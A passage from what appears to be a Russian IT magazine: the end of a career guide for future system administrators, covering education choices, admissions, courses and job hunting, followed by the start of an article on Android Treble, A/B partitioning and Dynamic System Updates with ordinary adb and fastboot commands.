заменить не только информа тику, но и дру гие предметы, включая начальные
курсы вуза. Увы, русские суб титры там есть не у всех роликов.
   Ну и конечно, YouTube — это неисчерпаемый источник не только развле‐
чения, но и знаний. Поищи нужную тему — наверняка найдешь много полез‐
ного.
   Что до книг, то здесь выбор огромен, но по боль шей части не для школь‐
ного возраста. Впрочем, тем, кто пос тарше, рекомендую учиться читать
взрослую литературу и привыкать к ней.
   Ну и для один надцатиклассников совет прос той: читать и качать скиллы
в свободное время нужно, но только если оно есть. Подготовка к ЕГЭ — это,
как ни крути, главная задача, которая критически важна для поступления в вуз.
В десятом классе еще можно делать проекты и ходить на курсы, но в один‐
надцатом про все это придется забыть.


КОЛЛЕДЖ ИЛИ ВУЗ?
Поступать ли в вуз вооб ще — это отдельный вопрос, который стоит обдумать.
Возможно, хватит и кол леджа, осо бенно если ты бы хотел поскорее начать
работать и зарабатывать. Давай посмотрим, какие достоинства и недос татки
у обоих типов заведений.


Кол ледж
Плюсы:
 • получаешь профессию на два года раньше;
 • только практические знания;
 • дешевле, чем платное образова ние в вузе.

Минусы:
 • образование среднее, а не высшее;
 • не дает глубоких теоретичес ких зна ний;
 • только временная отсрочка от армии.

Выбирать колледж можно по наз ванию прог раммы и содержанию курсов.
Для системного администра тора два лучших кол леджа в Мос кве — Колледж
связи № 54 и Кол ледж предпринимательства № 11. Самые сильные учителя
сетевого администрирования — Сер гей Никола евич Хохлов (Колледж связи),
Илья Михайлович Шварцман (Колледж предпри нима тельства № 11).


Вуз
Плюсы:
 • высшее образование;
 • большой объем знаний;
 • военная кафедра;
 • возможность получить мес то в общежитии;
 • возможность продол жить научную деятельность.

Минусы:
 • профессию получаешь на два года дольше (как минимум);
 • высокий конкурс на бюджетные отделения, с общежитием — еще больше;
 • высокая цена на платное обучение.

С одной стороны, тратить лиш ние два‐три года на вещи типа физики, химии,
инженерной графики и даже матана лиза, когда совершенно уверен, что
хочешь быть сисадмином, может быть излишне. С дру гой стороны, вос‐
поминания о них нет‐нет да и пригодятся на практике, не говоря уже о пос‐
ледних курсах на профильных специаль ностях.
   Также, если ты планиру ешь когда‐нибудь претендовать на начальственные
роли в крупных организациях, корочка как минимум будет плюсом с точки
зрения HR, да и допол нитель ные дисциплины типа экономи ки не повредят.
Опять же если удалось пос тупить на бюджетное, то у такого образования есть
весомый плюс: оно бесплатное!
   Ну и конечно, два‐три года изучения общих дисциплин, скорее всего,
предпочтительнее, чем год в армии. Колледж дает отсрочку только на время
обучения в нем, а вот наличие в вузе военной кафедры означает, что ты
получишь звание лейтенанта запаса и максимум,  что тебе грозит, —
это военные сборы.

Зачем учить «лиш нее»
Я могу вспомнить два случая, когда системному админис тратору понадо‐
бились знания, полученные в институте.
  Слу чай первый. Офис компании занимает два этажа исторического
здания (особняк XIX века, памят ник архи тек туры). Нужно тянуть локальную
сеть, долбить сте ны, крепить снаружи камеры видеонаблюдения и мон‐
тировать внутри коробы с обо рудованием, кабель‐каналы с проводами, а все
эти мероприятия нужно согласовывать с комитетом по охране памятников.
Тут очень пригодились навыки составления технической документации и чте‐
ния чертежей (поэтажные планы здания с ука занием существу ющих ком‐
муникаций).
  Слу чай вто рой. Предприятие выступало подрядчиком при организации
мероприятия с участием органов власти, заключив госконтракт. Размещение
серверных стоек, маршру тиза торов, точек дос тупа и оборудования в кон‐
ференц‐залах и пресс‐центре требовалось заранее согласовать с заказ‐
чиком в виде чертежей (по всем ГОСТам, с рамочками и «штампами»).
Здравствуй, начер татель ная геометрия и машинная графика, как хорошо, что
я тебя не прогуливал.
 — Валентин Хол могоров



ВЫБИРАЕМ СПЕЦИАЛЬНОСТЬ
Если ты остановился на вузе, то первое, с чем я рекомендую определить‐
ся, — это спе циальность, которую ты хочешь получить. Лучший выбор
для сетевика и многих дру гих айтишников — это направление 10.03.01
«Информационная безопасность».
  Почему именно ИБ? Из‐за качес тва программы. Все высшее образование
разбито на изучаемые науки. Информа тика попала в два сектора — «Матема‐
тические и естественные науки» и «Инженерное дело, технологии и тех‐
нологические науки». Нас будет интересо вать второй сектор, так как нам сто‐
ит изучать информатику не как подраздел матема тики, а отдельно. И не
как науку (мы же не теоретики), а как инженерное дело.
   Что изучается именно в ИБ, мож но почитать во ФГО Се (PDF). Однако
федеральные стандарты — это одно, а их реализация в конкретных вузах —
немного другое. При желании, порывшись на сай те вуза, ты можешь найти
планы занятий групп, которые учатся по нужной тебе специальнос ти. Нап‐
ример, находим на сайте МИРЭА стра ницу, посвященную нашей специаль‐
ности 10.03.01, и видим ссылку на учеб ный план. Да, при чтении можно сло‐
мать глаза (и шею), но уже гораз до понят нее, с чем придется столкнуться.
  Но даже тут ты не узнаешь, чему конкрет но будут учить. С точки зрения
системы образования нет особой разницы меж ду однотипными язы ками
программирования или базами данных. И в целом это справедливо, но сту‐
денты при выборе между, например, Pascal и Java или FoxPro и MySQL в обо‐
их случаях предпочтут второй, более современный вари ант. Чтобы выяснить
такие детали, лучше всего сходи на день открытых дверей и поспрашивай
преподавателей и старшекурсников.
  На какие еще специаль нос ти можно обра тить вни мание? Ищи по словам
«информатика», «информа ционные» или «IT». Главное — держись подальше
от «прикладной математики и информатики» (01.03.02). Здесь от всяких
математических «теорий» и «ана лизов» будет лопаться мозг, а практические
айтишные вещи  изучаются  по  остаточному  принципу  и  в  свободное
от решения интегралов время.


ВЫБИРАЕМ ВУЗ
В Москве и Санкт‐Петербурге выбор вузов боль шой, но найти идеально под‐
ходящий не так‐то прос то. Критериев много, в том чис ле не связанных
с самим обучением. Где‐то ниже проходной балл, где‐то выше, но есть обще‐
житие, где‐то абитуриентов привлека ют гиб кими схемами оплаты, а какие‐то
могут не подходить молодым людям из‐за отсутствия военной кафедры. Или,
например, близость к дому сэкономит время, которое можно потратить
с большей пользой.
   Чтобы найти все вузы, где студентов готовят по нужной спе циальнос ти,
идем на сайт EduNetwork или любой подоб ный, выбираем город и задаем
параметры. Можно, например, посмотреть все мос ковские вузы со спе циаль‐
ностью «Информационная безопасность» и военной кафедрой.
  С МИРЭА, МЭИ и МИФИ ты точно не промахнешься. А в Бауманке, нап‐
ример, «Информационной безопас ности» как таковой нет, есть только «Ин‐
формационная безопасность автоматизированных систем» (10.05.03, кафед‐
ра ИУ8), что не совсем то же самое. Кста ти, чему учат на других «ИУ», тоже
стоит посмотреть.
  Среди питерских вузов самый под ходящий для будуще го сисадмина —
Санкт‐Петербургский государс твенный университет телекоммуникаций им.
проф. М. А. Бонч‐Бруевича. Там как раз есть нап равление ИБ. Также можешь
рассмотреть Санкт‐Петербург ский политехнический универ ситет (Политех),
ЛЭТИ (электротехнический — с укло ном в «железо»), ИТМО и ГУАП (аэрокос‐
мического приборостроения).


О ПОСТУПЛЕНИИ
Схема поступления в последнее время силь но изменилась, хотя по‐прежнему
основана на проходных баллах.
  В июне все выпускники пишут экзамены ЕГЭ и по его результатам поступа‐
ют в вузы. Количество бюджетных мест все время меняется, но суть одна.
Есть две волны поступления — 80% и 20%. Ты подаешь свои документы в вуз
и получаешь доступ к онлайновой таб лице всех поступающих. Скорость
подачи здесь не принципиальна, одна ко сто ит сделать все заранее.
  В таблице поступающих важ ны две вещи: оригинал документов и согласие
на зачисление. Если и в той и в другой графе стоит «Есть», значит, человек
рассчитывает поступить именно в этот вуз. Смотри, на каком месте ты,
и сравнивай это значение с количеством бюджетных мест в вузе.
  Поступать луч ше на первой волне, так как вторая более непредсказуемая.
Бывает, например, что человек с высокими баллами пытался пос тупить, ска‐
жем, в Физтех. Это у него не получилось, он пси ханул и пошел в самый
«дешевый» (по баллам) вуз. И во вто рой вол не у лидера таб лицы бал лы могут
быть больше, чем у тех, кто пос тупил в первой.
   Таблица «Минимальный проходной» показывает минимальные проходные
баллы по второй волне. Прибавляй 30–40 баллов к этому году и получишь
следующий, но учти один момент. Если у поступа ющего в прошлом году был
набран тот самый минимальный балл — это не гарантия того, что он пос‐
тупил.
  Работает это так. Допустим, минимальный про ходной балл — 205. Эти
баллы распределены по трем направлениям — информатика, математика,
русский. Три человека написали экза мены на этот балл, но в таб лице они
будут на разном уровне, и, если место будет толь ко одно, поступит только
один. В таблице это будет выг лядеть так:
 1. Информатика — 69, матема тика — 68, рус ский язык — 68.
 2. Информатика — 68, матема тика — 69, рус ский язык — 68.
 3. Информатика — 68, матема тика — 68, рус ский язык — 69.

То есть учитывается приоритет экза мена. При оритеты выс тавляет вуз, но на
ИБ чаще всего он именно такой: информатика, математика, русский.


Счи таем бал лы
На сайте postyplenie.ru есть калькулятор бал лов, где вузы можно отсорти‐
ровать по программам обучения, проходным бал лам на бюджетное отде‐
ление и цене обучения (работает для вузов Москвы и Санкт‐Петербурга).
Сортировка «по деньгам» — слева, «по баллам» — справа.
  Под бор по цене обу чения. В графе «Специальность» выбираем
«Инженерное дело, технологии и технологические науки» и цену обучения.
Жмем «Поиск» и смотрим, что получилось. Теперь, если хочешь идти на ИБ,
ищи  поиском  по  странице  сло ва  «Информа ционная  безопасность»
без каких‐либо приставок, приписок или изменений. Это гарантия того, что
курс соответствует именно это му ФГО Су.
  Под бор по про ход ным бал лам. Предположим, сейчас ты не знаешь
точно, какие у тебя будут баллы за государственные экзамены, но можешь
прикинуть (лучше скинь баллов десять для верности — вдруг на экзамене
переволнуешься). Вбивай результат в таб лицу «Баллы ЕГЭ» и жми кнопку
«Рассчитать». Дальше точно так же ищешь желаемую спе циальность по наз‐
ванию или коду.



САМООБУЧЕНИЕ
Независимо от того, где ты учишься, ты наверняка столкнешься с проблемой
устаревания информации. Технологии изменяются так быстро, что прог‐
раммы курсов за ними не поспева ют. Если в матема тике или физике отста‐
вание на пять лет ничего не зна чит, в случае с ИТ оно может привести к тому,
что преподавать будут нечто напрочь устаревшее.
   Вот небольшой список основных знаний и умений, которые совершенно
точно пригодят ся, если ты собираешь ся искать работу сисадмином. Он
отсортирован от простого к сложному.
 • Устройство ПК (сборка‐разборка);
 • умение проложить витую пару, смонтировать сетевую розетку, обжать
   разъем RJ45;
 • операционные системы семейства Windows;
 • операционные системы Linux;
 • умение работать со сценариями автомати зации и командной оболочкой
   (PowerShell для Windows, SH/Bash для Linux);
 • настройка сетевого оборудования (маршру тиза торы, точки доступа);
 • знание IP‐телефонии и умение с ней работать;
 • знание серверной архитектуры, умение обра щаться как минимум с IIS, ng‐
    nix, Apache и их дополнительными модулями;
 • основные принципы построения сети (понимание, что такое сетевой про‐
   токол, и знание модели OSI);
 • работа с протоко лами на уровнях OSI (понимать, что это и зачем нужно);
 • настройка протоко лов OSI;
 • протоколы маршрутиза ции (статический и динамические);
 • классификация динамических про токолов (дис танционно‐векторные про‐
   токолы и протоколы состояния каналов связи);
 • настройка протоко лов;
 • безопасность сети (основные принципы);
 • настройка межсетевых экра нов;
 • виртуализация и контейнериза ция.

И дополнительно...
 • Программирование. Сис темным адми нистраторам порой приходится
   оптимизировать процессы, и до кодин га тоже доходит. Здесь не повредит
   знание какого‐нибудь скрип тового язы ка, например Python. На нем легко
   начать программировать, а запас воз можнос тей огромен.
 • Ан глийский язык. Это абсолютный маст‐хэв. Без язы ка администратору
   никуда. Но до свободного владения добивать необязательно: для начала
   хватит базовых знаний (уровень B).
 • Веб‑раз работка. Необя зательно  углубляться  в программи рование,
   но иметь навыки верстки в HTML и CSS не помешает, равно как и
   понимать прин цип работы движка сайта и базы данных.
 • Азы педаго гики. Она тебе пот ребуется. А еще лучше сразу освоить
   и азы медитации! :‐)


КУРСЫ
Поскольку сам я избрал путь инженера Cisco, то здесь траектория обучения
известна мне лучше всего. Вот набор курсов, который я считаю идеальным.
 • Introduction to IoT (русский);
 • IT Essentials (русский);
    • дополнение — Networking Essentials (русский);
 • Introduction to Cybersecurity (русский);
 • Cybersecurity Essentials (русский);
 • CCNA 7: Introduction to Networks (русский);
 • CCNA 7: Switching, Routing, and Wireless Essentials (русский);
 • CCNA 7: Enterprise Networking, Security, and Automation (русский). Кстати,
   раньше был набор из четырех курсов (все на русском): CCNA 6 — CCNA
   R&S: Introduction to Networks, CCNA R&S: Routing and Switching Essentials,
  CCNA R&S: Connecting Networks, CCNA R&S: Scaling Networks. На мой
   взгляд, это было более пра вильное решение;
 • CCNA Cybersecurity Operations (русский);
 • CCNA Security (русский);
 • CCNP (английский).

Обрати внимание: курс CCNP представлен только на английском язы ке
и переводить его не будут, так как под разумевается, что специалист уровня
CCNP знает этот язык.
  Из любопытного: есть курс CCNA Discovery. Он на русском язы ке и удален
из сети Cisco, что большая редкость. Сейчас его можно найти на прос торах
интернета. Пройти все эти курсы — хороший старт для сисадмина, но и цена
там бывает очень разной. Главное — по окончании каждого курса ты получа‐
ешь сертификат, который весьма сильно котируется работодателями.
   Если же обучение на перечисленных выше  курсах не по карману,
на помощь приходят ребята из ака демии IT DarkMaycal Sysadmins. У них есть
три видеокурса:
 • построение сетей Cisco с нуля (на мой взгляд, лучший у них курс);
 • телефония Asterisk с нуля (базовые зна ния в IP‐телефонии);
 • администрирование 1С с нуля (начальные навыки работы с 1С).

Эти курсы не так дороги, одна ко профес сиональ ный сертификат пос ле них ты
не получишь. Сейчас выдают сертификат о про хождении курса, но работо‐
дателю он, как правило, безразличен.
   Есть варианты еще дешевле — от ребят из NetSkills. В их арсенале нес‐
колько видеокурсов:
 • курс UNetLab;
 • курс молодого бой ца Cisco Packet Tracer — на мой взгляд, лучший курс;
 • курс «Основы GNS3» — почетное вто рое мес то;
 • Linux для начинающих. Базовый курс;
 • курс по MikroTik;
 • CheckPoint SandBlast.

Курсы сильно дешевле аналогов, но и не так глубоки, как видеокурсы
DarkMaycal.
   Если для тебя дорого и это и ты не готов тра тить деньги на дополнитель‐
ное образование, почитай следующие матери алы, которые помогут тебе обу‐
читься бесплатно.
 • Прекрасный курс «Сети для самых малень ких» на «Хабрахабре». Он очень
  добротно рассказывает о сетевых технологи ях и бесплатен, но име ет
   весьма высокий порог входа;
 • на том же портале лично я час тенько выкладываю обучающие статьи
   для молодых сетевых администраторов;
 • один из лучших курсов по Python для сетевых адми нис траторов — «Python
   для сетевых инженеров».

Для самостоятельной подготовки к сда че экзаменов Cisco можно исполь‐
зовать их официальные руководс тва (книги на рус ском) (читать лучше в ука‐
занном порядке).
 • Одом У. Официальное руководс тво Cisco CCENT‐CCNA ICND1 640‐822
   (Cisco Press Core Series), 2013.
 • Одом У. CISCO Официальное руководс тво по подготовке к сертифика‐
   ционным экзаменам CCENT CCNA ICND2, 2011.
 • Одом У. Cisco CCNA. Маршрутизация и коммутация ICND2 200‐101 (Офи‐
   циальное руководство), 2015.
 • Программа сетевой ака демии Cisco CCNA 1 и  2. Вспомогательное
   руководство.
 • Программа сетевой ака демии Cisco CCNA 3 и  4. Вспомогательное
   руководство.
 • Для понимания ситуации в мире почитай отчеты Cisco по кибербезопас‐
   ности.
 • Wiley Brand. Network Monitoring For Dummies (SolarWinds Special Edition),
   2016. Книгу можно бес платно получить на сайте компании SolarWinds.
 • Крэйг Хант. TCP/IP. Сетевое администрирование. 3‐е издание, 2004 —
  наша библия.
 • Эви Немет, Гарт Снайдер, Трент Хейн, Бэн Уэйли. Unix и Linux. Руководство
   системного администратора, 2012. Лучшая кни га по Линуксу.
 • Адитья  Бхаргава.  Гро каем  алго ритмы.  Иллюс трированное  пособие
   для программистов и любопытству ющих, 2017. Очень интересная книга
   для всех людей, которые хотят что‐то понять в алгоритмах, а это важно
   для админов. Не веришь? Посмотри статью по ссылке.
 • Куроуз Росс. Компьютерные сети. Нисходящий подход, 2016.
 • Джером Ф. Димарцио. Маршрутизаторы Cisco. Пособие для самос‐
   тоятельного изучения. 2‐е издание, 2003.
 • Джон Эриксон. Хакинг: искусство экс плой та. 2‐е издание, 2010.


ТРУДОУСТРОЙСТВО
Как понять, заставят ли тебя ползать под столами с мотком витой пары
в зубах, а потом чинить сайт, который на коленке склепал пле менник дирек‐
тора, или направят на администрирование высоко нагруженного серверного
кластера? Это, пожалуй, главное, что волнует молодых сисадминов при поис‐
ке работы.
  Самый простой ориентир — это размер орга низации. Если в мелкой кон‐
торе ты будешь занимать ся вообще всем — в меру твоих способностей
и терпения, то в крупной куда больше шансов попасть в руки старших спе‐
циалистов. Они подскажут, что делать, и ты будешь не только работать, но и
учиться у них. Для первых лет карь еры это гораз до ценнее. Приходишь джу‐
ниором, а уходишь сеньором!
  Но обращать внимание нужно не только на размер компании, но и на ее
профиль. Например, встречаются очень маленькие конторы, которые работа‐
ют с крупными заказчиками, поэто му требования к техническому персоналу
там чрезвычайно высокие. Бывают огромные меж дународные корпорации,
в которых запросы намного ниже, а роли техничес кого персонала либо раз‐
мыты, либо распределены между сотрудниками, и каждый выполняет свою
небольшую отдельную функцию.
   Кстати, работа для сисадмина есть не только в час тных организациях, но и
в госструктурах. И они тоже быва ют раз ными, с раз ной спе циализаци ей, раз‐
ным подходом и разным уровнем компетенции руководс тва.
  Определить, куда ты попадешь, заранее невозможно. На собесе довании
может показаться, что вот он — рай для молодого тол кового спе циалис та, а в
действительности ты окажешься в техническом отделе, напоми нающем дом
престарелых — и по контингенту, и по подходу к работе. А бывает наоборот.
Потому ориентироваться нужно в первую очередь на отзывы тех сотрудников,
которые уже порабо тали в этой фирме.
  Короче, если перед тобой школа, оптовые торговцы автозапчастями
или парфюмерный салон — тебя ждут сайты и зап равка картриджей в прин‐
терах. Если это крупный интегра тор, хос тинг‐про вай дер, IT‐вендор — работа,
скорее всего, будет более интерес ной и более похожей на системное адми‐
нистрирование.
  И в общем случае подход «надо с чего‐то начинать» работает не лучшим
образом. Велик шанс, что ты просто потратишь несколько драгоценных лет
впустую, ничему не научишься и получишь сомнительную запись в трудовой
книжке. Так что совет прос той: смотри, куда идешь!


ИТОГИ
Итак, сказано было мно го, давай попробуем выделить основные мысли.
 • Сисадмин — это не программист, и обучение здесь будет дру гим. Хотя
   пересечения, безусловно, есть.
 • Далеко не любые IT‐школы полезны: чтобы были результаты, нужно смот‐
   реть, обучение там дают или в основном развлечение.
 • Выбор между вузом и колледжем — шту ка слож ная и зависит от личных
   обстоятельств. Если есть воз можность — иди в вуз, но и колледж — это не
   приговор. Главная ценность — это твои умения, а не корочка.
 • Устраивайся на такую работу, где будет шанс чему‐то научиться. Даже
  мелкие организации бывают разными.
 • Самообучение — наше все. Старайся научиться все му, что у тебя получа‐
   ется. Путь айтишника — постоянное саморазвитие.
 • Не давай «офису» поль зоваться тобой. Если ты чувству ешь, что не растешь
   как профессионал, — ухо ди, не теряй время и силы не там, где надо.
GEEK
 ОБНОВИТЬ
           НЕОБНОВЛЯЕМОЕ





                                      TREBLE,
                               A/B‐РАЗМЕТКА,
                         ДИНАМИЧЕСКИЕ
                         И МОДУЛЬНЫЕ
                          ОБНОВЛЕНИЯ
                                ANDROID





                                                                              Евгений Зобнин
                                                                                    Редактор Unixoid и Mobile
                                                                                                  zobnin@glc.ru





Представь себе смартфон, который обновляется до новой
версии ОС за секунды. Смартфон, который никогда не прев‐
ратится в кирпич из‐за неудач ного обновления. Смартфон,
который позволяет уста нав ливать вторую прошивку рядом
с основной и поддерживает десятки кас томных прошивок
сразу после выхода с конвейера. А ведь все это уже реаль‐
ность, которую даже не надо ждать.


Эта статья рассказывает о ряде технологий, которые были интегрированы
в Android в последние нес колько лет и приб лизили решение проблемы фраг‐
ментации, отсутствия обновлений и сущес твенно упростили создание кас‐
томных прошивок.


TREBLE
Вопреки расхожему мнению, основная проб лема, с которой стал киваются
производители смартфонов при обновлении прошивок своих телефонов, —
это вовсе не пофигизм и лень (хотя это тоже часто встречается), а необ‐
ходимость ждать, пока производители чипсетов и других хардварных ком‐
понентов обновят драй веры до новой версии Android.
  Дело в том, что Android, как и многие дру гие про дукты Google, очень дол‐
гое время развивался в режиме вечной беты. Это значит, что Android менял‐
ся. Не только и не столько в плане интерфейса, сколько в плане внутренней
архитектуры.
  В  Android  никогда  не  было  устоявшегося,  обратно  совместимого
интерфейса между системой и драйверами. В боль шинстве слу чаев нельзя
было просто взять новую версию Android и «посадить» ее на драйверы и ядро
Linux от старой версии. Почти всегда что‐нибудь да отваливалось.
   Требовались обновленные драйверы, разработ кой которых занимался
производитель железа, а вовсе не про изво дитель смартфона. Поэтому, если
производитель чипсета, камеры или Wi‐Fi‐адап тера по тем или иным при‐
чинам отказывался под держивать старое железо (что происходит очень час‐
то, а в случае с такими компаниями, как MediaTek, постоянно), полноценный
порт новой версии Android ста новится почти невозможен.
  Создатели кастомных прошивок искали обходные пути, чтобы зас тавить
новую версию Android работать на старых драй верах. В дело шли любые при‐
емы от простого «не работа ет, забейте» до раз личных программных прос‐
лоек, обеспечивающих работу на устаревших драйверах. Так, в кастомных
прошивках для Xiaomi Redmi 1s есть прослой ка, которая позволяет исполь‐
зовать камеру в Android 7.1.1, хотя драйверы для нее застряли еще на уровне
версии 4.4.4.
  Однако для компании — производителя смартфона такой подход зачастую
неприемлем. Устрой ство с выполненным подоб ным образом портом может
просто не пройти сертификацию Google. Кроме того, такие прос лойки неред‐
ко приводят к сбоям в неожиданных местах и не обес печивают новую функци‐
ональность, которая может требовать ся Android для корректной работы (нап‐
ример, поддержка новых режимов камеры).
  К счастью, в какой‐то момент Google решила положить конец этой вак‐
ханалии и стандартизовать‐таки программный интерфейс между драйверами
и Android. Это и есть инициатива Treble, и она была воплощена в жизнь в An‐
droid 8.0.
   Суть Treble проста и уже должна быть понят на: код Android раз деляется
на две независимые час ти, одна из которых содержит драйверы и весь
зависимый от железа код, а вто рая — саму операционную систему. Програм‐
мный интерфейс между этими компонентами стандартизуется и остается ста‐
бильным между релизами Android. Как результат, для портирования новой
версии Android достаточ но портировать платформенно независимую часть
системы, и она кор ректно зарабо тает на имеющихся драйверах и версии
ядра Linux, с которой смартфон был выпущен на рынок.





                               Так было...





                                           ...а так теперь

Это в теории. На практике же есть пара подводных камней.
 1. Android будет продолжать раз вивать ся, и новые функции могут пот‐
   ребовать изменений в Treble. Раз работчики Android предус мотрели это и
   гарантируют, что существующие версии API Treble продол жат поддержи‐
   ваться минимум три года (пока неточно). При этом часть функций, которые
   не могут быть реализованы с использованием старых версий Treble, пла‐
   нируется либо эмулировать, либо просто отключать. По сути, Android будет
   вклю чать официальные прос лойки совместимос ти по типу тех, что раньше
   приходилось придумывать раз работчикам кас томных прошивок.
 2. Treble до сих пор находится в процес се раз вития и содержит несколько
   важных API (например, в совместимых с Treble прошивках может отвалить‐
   ся сканер отпе чатков пальцев). Также существу ет проблема, когда про‐
   изводитель смартфона намеренно или случайно ломает Treble API (привет,
   Huawei), так что без кос тылей Treble‐совместимые прошивки на таком
  смартфоне не зарабо тают.

Теперь о самих Treble‐совместимых про шивках. Сра зу пос ле выпуска Android
8.0 Google начала публиковать так называ емые образы GSI (Generic System
Image). Это официальная сборка «чистого» Android (AOSP) для Treble‐сов‐
местимых устрой ств. В теории ее можно про шить на раз блокированное
устройство с помощью fastboot и получить офи циальный Android.





                 Android 10 GSI на 15 различных устройствах

Чуть позже GSI‐сборки начали подготавливать и разработчики кастомных
прошивок. Например, ты можешь скачать GSI‐сбор ку от phhusson с множес‐
твом фиксов для разных устройств. В теме, посвященной Treble, на 4PDA есть
множество Treble‐совместимых прошивок, вклю чая LineageOS. Ну а про‐
верить свое устрой ство на совместимость с Treble можно с помощью при‐
ложения Treble Check.


A/B-РАЗМЕТКА
Еще одна проблема с обновлениями — отказ поль зователей. Как показы вает
практика, многие владельцы смартфонов не хотят обновлять свои устрой ства,
потому что: а) это отнимает время, в течение которого смартфон будет
недоступен для использования;  б) после обновления смартфон может
работать некорректно или не включиться вооб ще.
  В свое время разработчики Chrome OS также столкнулись с этой проб‐
лемой и создали надежную и незаметную пользователю систему бесшовного
обновления (Seamless updates). Суть ее состоит в том, что вместо одного
системного раздела, поверх которого накладыва лись бы обновле ния сис‐
темы, Chrome OS использует два идентичных сис темных раз дела, каждый
из которых содержит свою копию операционной системы.
  Обновление в Chrome OS происхо дит следующим образом: когда ОС
обнаруживает наличие обновления, она скачива ет его в фоне, устанавливает
на  второй  (неактивный)  системный  раздел  и  помечает  этот  раздел
как активный. После перезагрузки (не обязательно сразу пос ле обновления)
ОС запускается уже с это го раз дела.
   Благодаря такой схеме пользователь даже не подоз ревает, что система
обновилась, он просто попадает в обновленную ОС после перезагрузки
или включения ноутбука. При этом Chrome OS способна гарантировать, что
после обновления поль зователь не получит кирпич: если во время загрузки
с обновленного раздела произойдет сбой — система пометит текущий раз‐
дел флагом unbootable, сделает активным «старый» системный раздел и заг‐
рузит заведомо рабочую версию ОС.
  Начиная с седьмой версии Android  также поддерживает бес шовные
обновления и так называемую A/B‐раз метку разделов. Однако, так как сис‐
темных разделов в устройствах с Android намного больше, чем в хромбуках,
сама раскладка разделов получается более запутанной. Вот только часть
разделов, которые пришлось дублировать:
 • boot — содержит ядро и RAM‐диск, на устройствах с A/B‐разметкой также
   консоль восстановления (recovery);
 • system — содержит Android, системные биб лиотеки, сис темные приложе‐
   ния, стандартные рингтоны, обои и так далее;
 • vendor — драйверы и все необходимые прослойки для работы с железом
   (Project Treble);
 • userdata — настрой ки, приложения и данные пользователя;
 • radio — прошив ка радиомодуля (поддержка сотовых сетей);
 • vbmeta — раздел Android Veriﬁed Boot 2.0 (механизм доверенной заг‐
   рузки), содержащий кон трольные суммы компонентов сис темы.

Всего дублированных раз делов может быть нес колько десятков. Например,
на OnePlus 6 с A/B‐разметкой общее количес тво раз делов — 72 и нес колько
десятков из них исполь зуются только загрузчиком.
  От других разделов, наобо рот, стало воз можным отказаться. Устройства
с A/B‐разметкой не вклю чают в себя отдельный раздел recovery (консоль
восстановления, нужна для уста новки обновления и сброса до заводских нас‐
троек) и раздел cache, который использовался для  хранения файлов
обновлений (теперь обновление ска чива ется напрямую в неактивный раз‐
дел).





              Двой ные раз делы на смартфоне OnePlus 6

A/B‐разметка также позволила вдвое сократить размер раз дела system, что
вкупе с удалением раз делов recovery и cache сделало переход на новую
схему разметки менее болезненным. Нап ример, на смартфонах Pixel потеря
пространства составила всего нес колько сотен мегабайт.


 Раз дел         Раз мер A/B           Раз мер A-only

  Bootloader        50 Мбайт × 2            50 Мбайт

 Boot             32 Мбайт × 2            32 Мбайт

 Recovery         0                      32 Мбайт

 Cache            0                      100 Мбайт

 Radio            70 Мбайт × 2            70 Мбайт

 Vendor           300 Мбайт × 2           300 Мбайт

 System           2048 Мбайт × 2          4096 Мбайт

 Всего            5000 Мбайт             4680 Мбайт

Еще одно достоинство A/B‐разметки — отсутс твие экрана «Android is upgrad‐
ing…» после обновления. Сис тема просто заг ружа ется как обычно. Также
A/B‐разметка упрощает тес тирова ние кастомных прошивок: кастом можно
поставить второй системой и откатиться на первую, если что‐то пойдет
не так.
  В целом одни плюсы и никаких минусов. Проб лема только в том, что A/B‐
разметка до сих пор остается опциональной, а перешли на нее далеко не все
производители смартфонов. Даже Samsung — крупнейший производитель
устройств на Android — до сих пор использует ста рую раз метку. И связано
это, скорее всего, с нежеланием тра тить средс тва и вре мя на перепрофили‐
рование уже работающей и отлаженной системы обновления.
  Проверить,  поддерживает  ли  твой  смартфон  A/B‐разметку, можно
с помощью все того же приложения Treble Check из предыдущего раз дела
или прочитав переменную ro.build.ab_update с помощью ADB:


$ adb shell getprop ro.build.ab_update


Шпар галка по управле нию A/B-раз делами с помощью
fastboot
Узнать, какой слот (группа разделов) теперь активен:


 $ fastboot getvar all | grep “current‐slot”


Сделать неактивный в данный момент слот активным:


 $ fastboot set_active other


Сделать активным указанный слот (a или b):


 $ fastboot set_active СЛОТ


Прошить указанный раз дел:


 $ fastboot flash имя_раздела_a partition.img
 $ fastboot flash имя_раздела_b partition.img





ДИНАМИЧЕСКИЕ ОБНОВЛЕНИЯ
Project Treble открыл дорогу для еще одной весь ма полезной функции — Dy‐
namic System Updates (DSU). Этот механизм появился в Android 10 специаль‐
но для пользователей и разработчиков, которые хотят протестировать новую
(бета) версию Android, но не жела ют жертво вать для этого установленной
системой и своими данными.
  DSU базируется на технологии Dynamic Partitions, которая должна быть
реализована во всех устройствах, выпущенных на рынок с Android  10.
При использовании Dynamic Partitions в смартфоне, по сути, есть только один
суперраздел, в котором система может создавать динамические разделы,
удалять их и менять размеры (такое возможно благодаря модулю ядра Linux
dm‐linear).
  Все системные разделы в таком смартфоне тоже динамические (кроме
загрузочных разделов: boot, dtbo и vbmeta). Поэтому при необходимости сис‐
тема может сдвинуть их, чтобы освободить мес то для дополнительных раз‐
делов. Именно так делает функция DSU. Она уменьшает размер системных
разделов, создает в освободившемся прос транстве еще один набор сис‐
темных разделов и устанавлива ет в него образ  GSI. Далее смартфон
перезагружается в эту свежеус тановленную сис тему, а следующая перезаг‐
рузка выполняется вновь со стандартных разделов.
   Чтобы установить образ GSI, используя DSU, для начала необходимо раз‐
блокировать загрузчик смартфона. Затем активировать DSU с помощью ADB:


$ adb shell setprop persist.sys.fflag.override.settings_dynami
c_system true

Затем нужно скачать сам образ, рас паковать и закинуть его на внутреннюю
карту памяти смартфона:


$ gzip ‐c system_raw.img > system_raw.gz
$ adb push system_raw.gz /storage/emulated/0/Download/

Затем можно запустить уста новку:


$ adb shell am start‐activity \
‐n com.android.dynsystem/com.android.dynsystem.VerificationActivity
\
‐a android.os.image.action.START_INSTALL    \
‐d file:///storage/emulated/0/Download/system_raw.gz  \
‐‐el KEY_SYSTEM_SIZE $(du ‐b system_raw.img|cut ‐f1)  \
‐‐el KEY_USERDATA_SIZE 8589934592

После окончания установки в шторке появится уведомление с предложением
перезагрузиться.





       Предложение перезаг рузить смартфон после установки GSI

Сложно, не правда ли? Именно поэтому в Android 11 появилась функция
под названием DSU Loader. Она позволяет авто матичес ки загрузить и уста‐
новить образ GSI в пару кликов.
  В текущих сбор ках Android 11 DSU Loader требует разблокированный заг‐
